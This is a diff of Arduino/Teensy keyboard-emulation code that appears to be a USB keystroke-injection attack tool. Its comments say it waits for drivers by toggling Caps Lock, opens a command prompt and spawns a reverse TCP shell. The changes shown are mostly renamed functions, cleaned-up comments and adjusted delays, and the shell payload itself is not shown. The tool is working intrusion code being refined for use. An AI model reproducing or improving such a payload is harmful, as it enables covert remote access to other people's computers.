@@ -26,7 +26,7 @@ void setup()
     parseNet();
        
     // Wait for drivers to install.
-    hurryUp();
+    waitForDrivers();
 
     // This gets our shell.
     spawnReverseTCP();
@@ -34,6 +34,7 @@ void setup()
 
 void loop()
 {
+    returnCode(1, 2000);
 }
 
 
@@ -56,18 +57,21 @@ void parseNet()
 }
 
 // Wait for the driver to finish installing.
-void hurryUp()
+void waitForDrivers()
 {
     // Check if Caps Lock is controllable yet.
-    boolean areWeThereYet = capsCheck();
+    boolean oldCaps = capsCheck();
 
-    // Spam the shit out of it if not.
-    while (areWeThereYet == capsCheck())
+    // Spam it if it is not controllable
+    while (oldCaps == capsCheck())
     {
         returnCode(1, 500);
-        hitCaps();
+        toggleCaps();
     }
-    hitCaps();
+    // If caps lock still on, kill it
+    if (capsCheck()) {
+        toggleCaps();
+    }
 }
 
 // Check if Caps Lock is on.
@@ -91,7 +95,7 @@ unsigned int activeLEDs()
 
 void returnCode(unsigned int numBlinks, unsigned int halfDelay)
 {
-    unsigned int count=0;
+    unsigned int count = 0;
     for(count = 0; count != numBlinks; count++)
     {
         digitalWrite(ledPin, HIGH);
@@ -102,7 +106,7 @@ void returnCode(unsigned int numBlinks, unsigned int halfDelay)
 }
 
 // Press the Caps Lock button.
-void hitCaps()
+void toggleCaps()
 {
     Keyboard.set_key1(KEY_CAPS_LOCK);
     Keyboard.send_now();
@@ -154,7 +158,7 @@ void spawnReverseTCP()
     clearKeys();
     
     // Give CMD some time to appear.
-    delay(3000);
+    delay(4000);
     
     // CMD is ready.
     returnCode(1, 100);
